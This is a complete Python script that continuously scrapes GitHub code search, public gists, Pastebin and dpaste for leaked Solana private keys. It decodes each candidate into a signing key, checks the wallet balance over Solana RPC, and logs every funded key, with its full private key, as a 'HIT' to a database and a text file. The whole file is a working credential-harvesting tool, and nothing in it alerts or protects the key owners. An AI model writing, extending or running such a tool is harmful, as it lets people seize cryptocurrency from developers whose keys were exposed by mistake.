#!/usr/bin/env python3
"""
solana_key_hunter.py -- continuously hunt for leaked Solana private keys.

Sources
-------
  github     GitHub code search (needs GITHUB_TOKEN)
  gists      GitHub public gist firehose
  pastebin   Pastebin scraping API (needs PASTEBIN_KEY or whitelisted IP)
  dpaste     dpaste.org recent pastes (best effort)

Configuration
-------------
Reads a .env file from the working directory (or --env-file PATH) before
anything else. Real environment variables take precedence over file values;
pass --env-override to invert that. Supported keys:

    GITHUB_TOKEN, PASTEBIN_KEY, SOLANA_RPC
    HUNTER_SOURCES, HUNTER_DB, HUNTER_INTERVAL, HUNTER_WORKERS,
    HUNTER_PAGES, HUNTER_QUERIES_PER_CYCLE, HUNTER_FRESH_DAYS,
    HUNTER_GITHUB_DELAY, HUNTER_MIN_LAMPORTS, HUNTER_LOG_FILE,
    HUNTER_VERBOSITY

  --init-env       write a .env template (chmod 600) and exit
  --no-dotenv      ignore .env entirely
  --show-config    dump resolved config with secrets masked, then exit

Verbosity
---------
  -q              warnings and errors only
  (default)       per-query, per-hit, per-cycle summaries
  -v  | --debug   + per-document: URL, status, size, timing, skip reasons
  -vv | --trace   + per-candidate: raw string, decoded length, rejection reason

Install
-------
    pip install requests base58 pynacl python-dotenv

Run
---
    python solana_key_hunter.py --init-env
    $EDITOR .env
    python solana_key_hunter.py -vv
"""

import argparse
import concurrent.futures as cf
import json
import logging
import os
import random
import re
import sqlite3
import stat
import sys
import threading
import time
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse

import base58
import requests
from nacl.signing import SigningKey

try:
    from dotenv import load_dotenv
    DOTENV_AVAILABLE = True
except ImportError:
    load_dotenv = None
    DOTENV_AVAILABLE = False

# --------------------------------------------------------------------------- #
# Config (refreshed after .env load)
# --------------------------------------------------------------------------- #
GITHUB_TOKEN = ""
PASTEBIN_KEY = ""
SOLANA_RPC = "https://api.mainnet-beta.solana.com"
RPC_FALLBACKS = []

DEFAULT_RPC = "https://api.mainnet-beta.solana.com"
EXTRA_RPC_FALLBACKS = [
    "https://rpc.ankr.com/solana",
    "https://solana.public-rpc.com",
]

ENV_TEMPLATE = """\
# solana-key-hunter configuration
# Real environment variables override these values unless --env-override.

# GitHub classic PAT, no scopes required for public code search.
GITHUB_TOKEN=

# Optional. Needed for the pastebin source unless your IP is whitelisted
# at https://pastebin.com/tools#api_scraping
PASTEBIN_KEY=

# Use your own endpoint; the public one rate-limits hard.
SOLANA_RPC=https://api.mainnet-beta.solana.com

HUNTER_SOURCES=github,gists,pastebin,dpaste
HUNTER_DB=found_keys.db
HUNTER_INTERVAL=180
HUNTER_WORKERS=8
HUNTER_MIN_LAMPORTS=1
HUNTER_VERBOSITY=0
"""

UA = "solana-key-hunter/1.3 (+https://venice.ai)"
MAX_TEXT = 1_200_000
B58 = "1-9A-HJ-NP-Za-km-z"
KEYWORDS = ("solana", "Solana", "SOLANA", "keypair", "privateKey", "secretKey",
            "PRIVATE_KEY", "secret_key", "private_key")

RE_KEY64 = re.compile(rf"(?<![{B58}])[{B58}]{{86,90}}(?![{B58}])")
RE_KEY32 = re.compile(rf"(?<![{B58}])[{B58}]{{43,45}}(?![{B58}])")
RE_JSON_ARR = re.compile(r"\[\s*(?:\d{1,3}\s*,\s*){63}\d{1,3}\s*\]")
RE_CTX = re.compile(r"private|secret|keypair|signer|seed|wallet|solana", re.I)
RE_VRUN = re.compile(r"^-v{2,}$")

PRINT_LOCK = threading.Lock()
WRITE_LOCK = threading.Lock()
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": UA})

GITHUB_QUERIES = [
    '"privateKey" solana',
    '"secretKey" solana',
    '"SOLANA_PRIVATE_KEY"',
    '"PRIVATE_KEY" phantom',
    '"keypair" solana extension:json',
    'solana "private_key"',
    '"secret_key" solana',
    'filename:id.json solana',
    'filename:keypair.json',
    '"solana" "base58" private',
    '"keypair.json"',
    'solana "signer" "base58"',
]


def refresh_config():
    """Re-read the process environment into module globals."""
    global GITHUB_TOKEN, PASTEBIN_KEY, SOLANA_RPC, RPC_FALLBACKS
    GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "").strip()
    PASTEBIN_KEY = os.environ.get("PASTEBIN_KEY", "").strip()
    SOLANA_RPC = os.environ.get("SOLANA_RPC", DEFAULT_RPC).strip() or DEFAULT_RPC
    RPC_FALLBACKS = [SOLANA_RPC] + [u for u in EXTRA_RPC_FALLBACKS if u != SOLANA_RPC]


# --------------------------------------------------------------------------- #
# Dotenv
# --------------------------------------------------------------------------- #
def _parse_env_file_fallback(path, override=False):
    """Minimal KEY=VALUE reader used when python-dotenv is absent."""
    loaded = 0
    with open(path, "r", encoding="utf-8") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith("export "):
                line = line[7:].lstrip()
            if "=" not in line:
                continue
            k, v = line.split("=", 1)
            k, v = k.strip(), v.strip()
            if len(v) >= 2 and v[0] == v[-1] and v[0] in "'\"":
                v = v[1:-1]
            else:
                v = re.split(r"\s+#", v, maxsplit=1)[0].rstrip()
            if not k:
                continue
            if override or k not in os.environ:
                os.environ[k] = v
                loaded += 1
    return loaded


def count_env_keys(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return sum(1 for ln in f
                       if ln.strip() and not ln.strip().startswith("#") and "=" in ln)
    except OSError:
        return 0


def load_env_file(path, override=False):
    """-> (keys_loaded, mechanism, note)"""
    if not path:
        return 0, "none", "disabled"
    if not os.path.isfile(path):
        return 0, "none", "not found"
    n = count_env_keys(path)
    if DOTENV_AVAILABLE:
        load_dotenv(path, override=override)
        return n, "python-dotenv", "loaded"
    return _parse_env_file_fallback(path, override), "builtin-parser", "loaded"


def write_env_template(path, force=False):
    if os.path.exists(path) and not force:
        return False, "exists"
    with open(path, "w", encoding="utf-8") as f:
        f.write(ENV_TEMPLATE)
    try:
        os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)  # 600
    except OSError:
        pass
    return True, "written"


# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #
TRACE = 5
logging.addLevelName(TRACE, "TRACE")
log = logging.getLogger("hunter")


def trace(msg, *a):
    log.log(TRACE, msg, *a)


class ShortName(logging.Filter):
    def filter(self, record):
        record.thread = (record.threadName or "-")[-12:]
        return True


def resolve_level(verbosity):
    if verbosity < 0:
        return logging.WARNING
    if verbosity == 0:
        return logging.INFO
    if verbosity == 1:
        return logging.DEBUG
    return TRACE


def setup_logging(verbosity, log_file):
    level = resolve_level(verbosity)
    log.setLevel(level)
    log.propagate = False
    log.disabled = False

    fmt = logging.Formatter("%(asctime)s %(levelname)-5s [%(thread)s] %(message)s", "%H:%M:%S")

    con = logging.StreamHandler(sys.stdout)
    con.setFormatter(fmt)
    con.addFilter(ShortName())
    log.addHandler(con)

    if log_file:
        fh = logging.FileHandler(log_file, delay=True)
        fh.setFormatter(logging.Formatter(
            "%(asctime)s %(levelname)-5s [%(thread)s] %(message)s"))
        log.addHandler(fh)

    return level


# --------------------------------------------------------------------------- #
# Counters
# --------------------------------------------------------------------------- #
class Stats:
    FIELDS = ("urls_seen", "urls_fetched", "fetch_fail", "prefiltered", "docs_with_cands",
              "cands", "cand_reject", "keys_valid", "addr_known", "addr_new",
              "rpc_ok", "rpc_err", "hits")

    def __init__(self):
        self.lock = threading.Lock()
        self.d = {k: 0 for k in self.FIELDS}
        self.reasons = {}

    def inc(self, k, n=1):
        with self.lock:
            self.d[k] = self.d.get(k, 0) + n

    def reject(self, reason):
        with self.lock:
            self.reasons[reason] = self.reasons.get(reason, 0) + 1

    def snapshot(self):
        with self.lock:
            return dict(self.d), dict(self.reasons)

    def reset(self):
        with self.lock:
            self.d = {k: 0 for k in self.FIELDS}
            self.reasons = {}


STATS = Stats()


# --------------------------------------------------------------------------- #
# DB
# --------------------------------------------------------------------------- #
def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


class DB:
    def __init__(self, path):
        self.lock = threading.Lock()
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.executescript(
            """
            CREATE TABLE IF NOT EXISTS hits (
                address      TEXT PRIMARY KEY,
                key_b58      TEXT NOT NULL,
                key_json     TEXT NOT NULL,
                kind         TEXT,
                lamports     INTEGER,
                exists_at    INTEGER,
                source       TEXT,
                url          TEXT,
                first_seen   TEXT,
                last_checked TEXT,
                checks       INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS seen_urls (url TEXT PRIMARY KEY, ts TEXT);
            """
        )
        self.conn.commit()

    def has_address(self, address):
        with self.lock:
            return self.conn.execute(
                "SELECT 1 FROM hits WHERE address=?", (address,)).fetchone() is not None

    def touch(self, address):
        with self.lock:
            self.conn.execute(
                "UPDATE hits SET checks=checks+1, last_checked=? WHERE address=?",
                (now_iso(), address))
            self.conn.commit()

    def insert(self, row):
        with self.lock:
            self.conn.execute(
                """INSERT OR REPLACE INTO hits
                   (address, key_b58, key_json, kind, lamports, exists_at,
                    source, url, first_seen, last_checked, checks)
                   VALUES (?,?,?,?,?,?,?,?,?,?,1)""", row)
            self.conn.commit()

    def url_seen(self, url):
        with self.lock:
            return self.conn.execute(
                "SELECT 1 FROM seen_urls WHERE url=?", (url,)).fetchone() is not None

    def mark_url(self, url):
        with self.lock:
            self.conn.execute(
                "INSERT OR IGNORE INTO seen_urls (url, ts) VALUES (?,?)", (url, now_iso()))
            self.conn.commit()

    def stats(self):
        with self.lock:
            return self.conn.execute(
                "SELECT COUNT(*), COALESCE(SUM(lamports),0) FROM hits").fetchone()


# --------------------------------------------------------------------------- #
# Key handling
# --------------------------------------------------------------------------- #
def extract_candidates(text):
    out = []
    for m in RE_JSON_ARR.finditer(text):
        try:
            arr = json.loads(m.group(0))
        except Exception as e:
            STATS.reject("json array parse error")
            trace("  json array at %d did not parse: %s", m.start(), e)
            continue
        if len(arr) == 64 and all(isinstance(b, int) and 0 <= b <= 255 for b in arr):
            trace("  candidate json64 at %d: [%d bytes]", m.start(), len(arr))
            out.append((bytes(arr), "json"))
        else:
            STATS.reject("json array wrong shape")
            trace("  json array at %d rejected: len=%d", m.start(), len(arr))

    for m in RE_KEY64.finditer(text):
        trace("  candidate b58-64 at %d: %s...", m.start(), m.group(0)[:16])
        out.append((m.group(0), "b58-64"))

    for m in RE_KEY32.finditer(text):
        start = max(0, m.start() - 220)
        window = text[start:m.start() + 80]
        if RE_CTX.search(window):
            trace("  candidate b58-32 at %d: %s... (context ok)", m.start(), m.group(0)[:16])
            out.append((m.group(0), "b58-32"))
        else:
            STATS.reject("b58-32 without context")
            trace("  skip b58-32 at %d: %s... no context", m.start(), m.group(0)[:16])

    return out


def to_keypair(cand, kind):
    """-> (SigningKey, pubkey_half_matches|None, raw_bytes) or (None, reason, None)."""
    if kind == "json":
        raw = cand
    else:
        try:
            raw = base58.b58decode(cand)
        except Exception as e:
            return None, f"base58 decode error: {e}", None

    trace("    decoded %s -> %d bytes", kind, len(raw))

    if len(raw) == 64:
        seed, pub = raw[:32], raw[32:]
        try:
            sk = SigningKey(seed)
        except Exception as e:
            return None, f"SigningKey failed: {e}", raw
        match = bytes(sk.verify_key) == pub
        if not match:
            log.debug("    pubkey half mismatch, using seed anyway")
        return sk, match, raw

    if len(raw) == 32:
        try:
            return SigningKey(raw), None, raw
        except Exception as e:
            return None, f"SigningKey failed: {e}", raw

    return None, f"decoded length {len(raw)} unsupported", raw


# --------------------------------------------------------------------------- #
# RPC
# --------------------------------------------------------------------------- #
def rpc(method, params, timeout=15):
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    last = None
    for attempt in range(1, 5):
        url = random.choice(RPC_FALLBACKS)
        host = urlparse(url).netloc
        t0 = time.time()
        try:
            r = SESSION.post(url, json=payload, timeout=timeout)
            dt = (time.time() - t0) * 1000
            log.debug("    rpc %s via %s -> %d in %.0fms (attempt %d)",
                      method, host, r.status_code, dt, attempt)
            if r.status_code == 429:
                STATS.inc("rpc_err")
                back = 2 + attempt * 3
                log.warning("    rpc 429 from %s, backing off %ss", host, back)
                time.sleep(back)
                continue
            r.raise_for_status()
            data = r.json()
            if "error" in data:
                raise RuntimeError(str(data["error"]))
            return data["result"]
        except Exception as e:
            last = e
            STATS.inc("rpc_err")
            log.warning("    rpc %s attempt %d via %s failed: %s", method, attempt, host, e)
            time.sleep(1.5 + attempt)
    raise last if last else RuntimeError("rpc failed")


def check_account(address):
    """-> (lamports, exists)."""
    res = rpc("getAccountInfo", [address, {"encoding": "base64", "commitment": "confirmed"}])
    value = (res or {}).get("value")
    if value is None:
        return 0, False
    return int(value.get("lamports") or 0), True


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #
def report(address, key_b58, key_json, lamports, exists, source, url, kind):
    sol = lamports / 1_000_000_000
    hot = lamports > 0
    with PRINT_LOCK:
        if hot:
            STATS.inc("hits")
            print("\n" + "=" * 78)
            print(f"  HIT  {sol:.9f} SOL   ({lamports} lamports)")
        else:
            print(f"\n---  empty  {address}  [{source}]")
        print(f"  address : {address}")
        print(f"  key     : {key_b58}")
        print(f"  json    : {key_json}")
        print(f"  format  : {kind}   account_exists={exists}")
        print(f"  source  : {url}")
        print(f"  explorer: https://solscan.io/account/{address}")
        if hot:
            print("=" * 78)
        sys.stdout.flush()

    if hot:
        with WRITE_LOCK:
            with open("hits.txt", "a") as f:
                f.write(f"{now_iso()}\t{sol:.9f}\t{address}\t{key_b58}\t{key_json}\t{url}\n")


# --------------------------------------------------------------------------- #
# Source enumeration
# --------------------------------------------------------------------------- #
def gh_headers():
    h = {"Accept": "application/vnd.github+json"}
    if GITHUB_TOKEN:
        h["Authorization"] = f"Bearer {GITHUB_TOKEN}"
    return h


def iter_github(args):
    if not GITHUB_TOKEN:
        log.warning("GITHUB_TOKEN unset -- code search will likely 401")
    headers = gh_headers()
    queries = list(GITHUB_QUERIES)
    if args.queries_file:
        with open(args.queries_file) as f:
            queries += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]

    random.shuffle(queries)
    for q in queries[: args.queries_per_cycle]:
        days = random.randint(0, max(0, args.fresh_days))
        cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).strftime("%Y-%m-%d")
        query = f"{q} pushed:>{cutoff}"
        log.info("[github] query %r (pages=1..%d)", query, args.pages)

        for page in range(1, args.pages + 1):
            params = {"q": query, "per_page": 100, "page": page,
                      "sort": "indexed", "order": "desc"}
            t0 = time.time()
            try:
                r = SESSION.get("https://api.github.com/search/code",
                                params=params, headers=headers, timeout=25)
            except Exception as e:
                log.error("[github] search transport error: %s", e)
                break

            log.debug("[github] page %d -> HTTP %d in %.0fms (remaining=%s)",
                      page, r.status_code, (time.time() - t0) * 1000,
                      r.headers.get("X-RateLimit-Remaining", "?"))

            if r.status_code in (403, 429):
                reset = r.headers.get("X-RateLimit-Reset")
                wait = max(5, int(reset) - int(time.time()) + 2) if reset else 30
                log.warning("[github] rate limited, sleeping %ss (reset=%s)", wait, reset)
                time.sleep(min(wait, 120))
                continue
            if r.status_code != 200:
                log.error("[github] HTTP %d: %s", r.status_code, r.text[:200])
                break

            body = r.json()
            items = body.get("items", [])
            log.info("[github] page %d: %d items (total_count=%s, incomplete=%s)",
                     page, len(items), body.get("total_count"), body.get("incomplete_results"))
            if not items:
                break

            for it in items:
                repo = it.get("repository", {}).get("full_name")
                path, sha = it.get("path"), it.get("sha")
                if not repo or not path:
                    continue
                raw = f"https://raw.githubusercontent.com/{repo}/{sha}/{path}"
                if not args.revisit and DB_REF.url_seen(raw):
                    STATS.inc("urls_seen")
                    trace("[github] already seen: %s", raw)
                    continue
                STATS.inc("urls_seen")
                trace("[github] queue %s", raw)
                yield raw, "github", {}
            time.sleep(args.github_delay)


def iter_gists(args):
    since = (datetime.now(timezone.utc) - timedelta(days=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
    headers = gh_headers()
    for page in range(1, 4):
        try:
            r = SESSION.get("https://api.github.com/gists/public",
                            params={"per_page": 100, "page": page, "since": since},
                            headers=headers, timeout=25)
        except Exception as e:
            log.error("[gists] transport error: %s", e)
            return
        log.debug("[gists] page %d -> HTTP %d", page, r.status_code)
        if r.status_code != 200:
            log.error("[gists] HTTP %d", r.status_code)
            return
        batch = r.json()
        log.info("[gists] page %d: %d gists", page, len(batch))
        if not batch:
            return
        for g in batch:
            for fmeta in (g.get("files") or {}).values():
                raw = fmeta.get("raw_url")
                if not raw:
                    continue
                if not args.revisit and DB_REF.url_seen(raw):
                    STATS.inc("urls_seen")
                    trace("[gists] already seen: %s", raw)
                    continue
                STATS.inc("urls_seen")
                trace("[gists] queue %s", raw)
                yield raw, "gist", {}
        time.sleep(1.0)


def iter_pastebin(args):
    url = "https://scrape.pastebin.com/api_scraping.php?limit=100"
    if PASTEBIN_KEY:
        url += f"&api_dev_key={PASTEBIN_KEY}"
    try:
        r = SESSION.get(url, timeout=25)
    except Exception as e:
        log.error("[pastebin] transport error: %s", e)
        return
    log.debug("[pastebin] HTTP %d ct=%s", r.status_code, r.headers.get("content-type"))
    if r.status_code != 200:
        log.error("[pastebin] HTTP %d", r.status_code)
        return
    try:
        items = r.json()
    except Exception:
        log.error("[pastebin] non-JSON body, IP probably not whitelisted")
        return
    log.info("[pastebin] %d recent pastes", len(items or []))
    for it in items or []:
        key = it.get("key")
        if not key:
            continue
        raw = f"https://pastebin.com/raw/{key}"
        if not args.revisit and DB_REF.url_seen(raw):
            STATS.inc("urls_seen")
            trace("[pastebin] already seen: %s", raw)
            continue
        STATS.inc("urls_seen")
        trace("[pastebin] queue %s (size=%s)", raw, it.get("size"))
        yield raw, "pastebin", {}


def iter_dpaste(args):
    try:
        r = SESSION.get("https://dpaste.org/api/recent/?limit=50", timeout=20)
        log.debug("[dpaste] HTTP %d", r.status_code)
        if r.status_code != 200:
            return
        items = r.json()
    except Exception as e:
        log.debug("[dpaste] skipped: %s", e)
        return
    if not isinstance(items, list):
        log.debug("[dpaste] unexpected payload %s", type(items))
        return
    log.info("[dpaste] %d recent pastes", len(items))
    for it in items:
        pid = it.get("id") or it.get("slug")
        if not pid:
            continue
        raw = f"https://dpaste.org/{pid}/raw/"
        if not args.revisit and DB_REF.url_seen(raw):
            STATS.inc("urls_seen")
            trace("[dpaste] already seen: %s", raw)
            continue
        STATS.inc("urls_seen")
        trace("[dpaste] queue %s", raw)
        yield raw, "dpaste", {}


SOURCES = {"github": iter_github, "gists": iter_gists,
           "pastebin": iter_pastebin, "dpaste": iter_dpaste}
DB_REF = None


# --------------------------------------------------------------------------- #
# Worker
# --------------------------------------------------------------------------- #
def process(url, source, headers, args):
    STATS.inc("urls_fetched")
    t0 = time.time()
    try:
        r = SESSION.get(url, headers=headers, timeout=25)
    except Exception as e:
        STATS.inc("fetch_fail")
        log.debug("[fetch] %s failed: %s", url, e)
        return
    finally:
        DB_REF.mark_url(url)

    dt = (time.time() - t0) * 1000
    ctype = r.headers.get("content-type", "")
    size = len(r.content)
    log.debug("[fetch] %s -> HTTP %d %s %dB in %.0fms",
              url, r.status_code, ctype.split(";")[0] or "-", size, dt)

    if r.status_code != 200:
        STATS.inc("fetch_fail")
        log.debug("[fetch]   non-200, skipped")
        return
    if any(b in ctype for b in ("image/", "audio/", "video/", "font/")):
        STATS.inc("prefiltered")
        log.debug("[fetch]   binary content-type, skipped")
        return

    text = r.text[:MAX_TEXT]
    if len(r.text) > MAX_TEXT:
        log.debug("[fetch]   truncated to %d chars", MAX_TEXT)

    if not args.no_prefilter:
        has_kw = any(t in text for t in KEYWORDS)
        has64 = RE_KEY64.search(text) is not None
        if not has_kw and not has64:
            STATS.inc("prefiltered")
            STATS.reject("document prefilter (no keyword, no 64B b58)")
            log.debug("[fetch]   prefiltered out: no keyword and no 64-byte candidate")
            return
        trace("[fetch]   prefilter pass: keyword=%s b58_64=%s", has_kw, bool(has64))

    cands = extract_candidates(text)
    log.debug("[fetch]   %d raw candidates", len(cands))
    if not cands:
        return
    STATS.inc("docs_with_cands")
    STATS.inc("cands", len(cands))

    seen = set()
    for cand, kind in cands:
        ident = cand if isinstance(cand, str) else cand.hex()
        if ident in seen:
            STATS.reject("duplicate within document")
            trace("  duplicate candidate in doc: %s", ident[:24])
            continue
        seen.add(ident)

        sk, ok, raw = to_keypair(cand, kind)
        if sk is None:
            STATS.inc("cand_reject")
            STATS.reject(ok)
            trace("  rejected %s: %s", ident[:24], ok)
            continue

        address = base58.b58encode(bytes(sk.verify_key)).decode()
        key_b58 = base58.b58encode(raw).decode()
        key_json = json.dumps(list(raw))
        trace("  valid keypair -> %s (%s)", address, kind)

        if DB_REF.has_address(address):
            STATS.inc("addr_known")
            STATS.reject("address already known")
            DB_REF.touch(address)
            trace("  %s already in DB, touched", address)
            continue

        STATS.inc("keys_valid")
        if args.no_balance:
            lamports, exists = 0, True
            log.debug("  [no-balance] %s recorded unqueried", address)
        else:
            try:
                lamports, exists = check_account(address)
            except Exception as e:
                STATS.reject("rpc failure")
                log.warning("  balance check failed for %s: %s", address, e)
                continue
            STATS.inc("rpc_ok")
            log.debug("  balance %s -> %d lamports exists=%s", address, lamports, exists)

        STATS.inc("addr_new")
        DB_REF.insert((address, key_b58, key_json, kind, lamports, int(exists),
                       source, url, now_iso(), now_iso()))

        if lamports >= int(args.min_lamports):
            report(address, key_b58, key_json, lamports, exists, source, url, kind)
        else:
            trace("  below --min-lamports, stored silently")


# --------------------------------------------------------------------------- #
# Cycle
# --------------------------------------------------------------------------- #
def run_cycle(args):
    STATS.reset()
    chosen = [s for s in args.sources.split(",") if s in SOURCES]
    if not chosen:
        log.error("no valid sources in %r", args.sources)
        return
    log.info("cycle start: sources=%s workers=%d", chosen, args.workers)

    t0 = time.time()
    with cf.ThreadPoolExecutor(max_workers=args.workers, thread_name_prefix="w") as pool:
        for name in chosen:
            log.info("source %s begin", name)
            try:
                n = 0
                for url, source, headers in SOURCES[name](args):
                    pool.submit(process, url, source, headers, args)
                    n += 1
                log.info("source %s enumerated %d urls", name, n)
            except Exception as e:
                log.exception("source %s crashed: %s", name, e)

    snap, reasons = STATS.snapshot()
    elapsed = time.time() - t0
    total, lamports = DB_REF.stats()

    print("\n" + "-" * 78)
    print(f"cycle done in {elapsed:.1f}s")
    print("  " + "  ".join(f"{k}={snap.get(k, 0)}" for k in Stats.FIELDS))
    if reasons:
        top = sorted(reasons.items(), key=lambda kv: -kv[1])
        print("  rejections: " + ", ".join(f"{r} x{n}" for r, n in top))
    print(f"  db: known keys={total} tracked lamports={lamports} ({lamports/1e9:.9f} SOL)")
    print("-" * 78 + "\n")
    sys.stdout.flush()


# --------------------------------------------------------------------------- #
# Argv / env plumbing
# --------------------------------------------------------------------------- #
def normalize_argv(argv):
    out = []
    for a in argv:
        if RE_VRUN.match(a):
            out.extend(["-v"] * (len(a) - 1))
        else:
            out.append(a)
    return out


def env_str(name, fallback):
    v = os.environ.get(name)
    return v if v not in (None, "") else fallback


def env_int(name, fallback):
    try:
        return int(os.environ[name])
    except (KeyError, ValueError):
        return fallback


def env_float(name, fallback):
    try:
        return float(os.environ[name])
    except (KeyError, ValueError):
        return fallback


def mask(secret):
    if not secret:
        return "unset"
    if len(secret) <= 8:
        return "set (" + "*" * len(secret) + ")"
    return "set (" + secret[:4] + "..." + secret[-4:] + ")"


def build_parser():
    p = argparse.ArgumentParser(description="Hunt for leaked Solana private keys")

    g = p.add_argument_group("config")
    g.add_argument("--env-file", default=os.environ.get("HUNTER_ENV_FILE", ".env"))
    g.add_argument("--no-dotenv", action="store_true")
    g.add_argument("--env-override", action="store_true",
                   help="let .env values beat real environment variables")
    g.add_argument("--init-env", action="store_true", help="write .env template and exit")
    g.add_argument("--force", action="store_true", help="overwrite existing .env")
    g.add_argument("--show-config", action="store_true")

    p.add_argument("-v", "--verbose", action="count", default=0,
                   help="-v document detail, -vv candidate detail")
    p.add_argument("--debug", action="store_true", help="same as -v")
    p.add_argument("--trace", action="store_true", help="same as -vv")
    p.add_argument("--verbosity", type=int, default=None, metavar="N",
                   help="explicit level: 0 normal, 1 debug, 2 trace")
    p.add_argument("-q", "--quiet", action="store_true", help="warnings and errors only")
    p.add_argument("--log-file", default=env_str("HUNTER_LOG_FILE", None))

    p.add_argument("--sources", default=env_str("HUNTER_SOURCES", "github,gists,pastebin,dpaste"))
    p.add_argument("--db", default=env_str("HUNTER_DB", "found_keys.db"))
    p.add_argument("--interval", type=int, default=env_int("HUNTER_INTERVAL", 180))
    p.add_argument("--workers", type=int, default=env_int("HUNTER_WORKERS", 8))
    p.add_argument("--pages", type=int, default=env_int("HUNTER_PAGES", 2))
    p.add_argument("--queries-per-cycle", type=int,
                   default=env_int("HUNTER_QUERIES_PER_CYCLE", 4))
    p.add_argument("--queries-file", default=env_str("HUNTER_QUERIES_FILE", None))
    p.add_argument("--fresh-days", type=int, default=env_int("HUNTER_FRESH_DAYS", 30))
    p.add_argument("--github-delay", type=float, default=env_float("HUNTER_GITHUB_DELAY", 6.5))
    p.add_argument("--min-lamports", type=int, default=env_int("HUNTER_MIN_LAMPORTS", 1))
    p.add_argument("--no-balance", action="store_true")
    p.add_argument("--no-prefilter", action="store_true")
    p.add_argument("--revisit", action="store_true")
    p.add_argument("--once", action="store_true")
    return p


def main():
    # Phase 1: env-file selection only, so .env can supply the rest.
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("--env-file", default=os.environ.get("HUNTER_ENV_FILE", ".env"))
    pre.add_argument("--no-dotenv", action="store_true")
    pre.add_argument("--env-override", action="store_true")
    pre.add_argument("--init-env", action="store_true")
    pre.add_argument("--force", action="store_true")
    pre_args, _ = pre.parse_known_args(normalize_argv(sys.argv[1:]))

    if pre_args.init_env:
        ok, why = write_env_template(pre_args.env_file, pre_args.force)
        print(f"{pre_args.env_file}: {why}")
        if ok:
            print("edit it, then rerun. add .env to .gitignore.")
        return 0 if ok else 1

    env_note = "disabled"
    if pre_args.no_dotenv:
        env_note = "disabled by --no-dotenv"
    else:
        n, mech, note = load_env_file(pre_args.env_file, pre_args.env_override)
        env_note = note if note != "loaded" else f"loaded {n} keys via {mech}"
        if note == "loaded" and not DOTENV_AVAILABLE:
            print("note: python-dotenv not installed, using builtin parser",
                  file=sys.stderr)

    refresh_config()

    args = build_parser().parse_args(normalize_argv(sys.argv[1:]))

    if args.verbosity is not None:
        verbosity = args.verbosity
    elif args.verbose or args.debug or args.trace:
        verbosity = args.verbose
        if args.trace:
            verbosity = max(verbosity, 2)
        elif args.debug:
            verbosity = max(verbosity, 1)
    else:
        verbosity = env_int("HUNTER_VERBOSITY", 0)

    quiet_override = args.quiet and verbosity > 0
    if args.quiet:
        verbosity = -1

    if args.show_config:
        rows = {
            "env_file": f"{args.env_file} ({env_note})",
            "env_override": args.env_override,
            "github_token": mask(GITHUB_TOKEN),
            "pastebin_key": mask(PASTEBIN_KEY),
            "solana_rpc": SOLANA_RPC,
            "sources": args.sources,
            "db": args.db,
            "interval": args.interval,
            "workers": args.workers,
            "pages": args.pages,
            "queries_per_cycle": args.queries_per_cycle,
            "fresh_days": args.fresh_days,
            "github_delay": args.github_delay,
            "min_lamports": args.min_lamports,
            "log_file": args.log_file,
            "verbosity": f"{verbosity} ({logging.getLevelName(resolve_level(verbosity))})",
        }
        width = max(len(k) for k in rows)
        for k, v in rows.items():
            print(f"{k:<{width}} : {v}")
        return 0

    level = setup_logging(verbosity, args.log_file)

    global DB_REF
    DB_REF = DB(args.db)

    log.info("solana-key-hunter %s", UA)
    log.info("dotenv: %s", env_note)
    log.info("verbosity raw=%d resolved=%s%s", verbosity, logging.getLevelName(level),
             " (quiet overrode -v)" if quiet_override else "")
    if level <= TRACE:
        log.log(TRACE, "TRACE active: per-candidate detail enabled")
    elif level <= logging.DEBUG:
        log.debug("DEBUG active: per-document detail enabled")

    log.info("db=%s sources=%s rpc=%s workers=%d interval=%ds",
             args.db, args.sources, SOLANA_RPC, args.workers, args.interval)
    log.info("github token=%s pastebin key=%s prefilter=%s",
             mask(GITHUB_TOKEN), mask(PASTEBIN_KEY), not args.no_prefilter)

    try:
        while True:
            t0 = time.time()
            try:
                run_cycle(args)
            except KeyboardInterrupt:
                raise
            except Exception:
                log.exception("cycle error")
            if args.once:
                break
            sleep = max(10, args.interval - (time.time() - t0))
            jitter = random.uniform(0, 10)
            log.info("sleeping %.0fs until next cycle", sleep + jitter)
            time.sleep(sleep + jitter)
    except KeyboardInterrupt:
        total, lamports = DB_REF.stats()
        log.warning("interrupted; %d keys tracked, %d lamports total", total, lamports)
    return 0


if __name__ == "__main__":
    sys.exit(main())